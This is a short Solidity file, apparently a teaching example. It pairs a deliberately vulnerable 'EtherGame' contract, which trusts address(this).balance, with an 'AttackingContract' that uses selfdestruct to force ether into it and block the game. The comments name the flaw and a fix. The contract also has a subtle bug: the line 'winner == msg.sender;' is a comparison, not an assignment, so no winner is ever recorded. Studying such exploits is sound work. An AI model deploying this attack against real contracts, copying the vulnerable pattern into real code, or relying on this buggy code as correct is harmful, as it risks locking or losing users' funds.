pragma solidity ^0.8.10;

// Here we are breaking a contract by taking advantage of the 
// poor use of this.balance and sending eth to the contract.
// A fix would be to use a state variable to keep track of the
// amount of eth deposited instead of using this.balance

// users can deposit 1 eth until a target amount is reached
// the last user to deposit wins all the deposited eth
contract EtherGame {
    // amount of eth at which the game is finished
    uint public targetAmount = 7 ether;

    // address of the winner of the game
    address public winner;

    // deposit eth and check for a winner
    function deposit() public payable {
        // each deposit must be equal to 1 eth
        require(msg.value == 1 ether, "You can only send 1 eth");
        uint balance = address(this).balance;
        // ensure that no player deposits after the game is over
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner == msg.sender;
        }
    }

    // send eth to the winner
    function claimReward() public {
        // ensure the caller is the winner
        require(msg.sender == winner, "You did not win");
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to send eth");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract AttackingContract {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    // send eth to a contract even though it should not be able to
    // receive eth via self destruction
    function attack() public payable {
        // we can break the game by sending eth so that the game balance >= 7
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}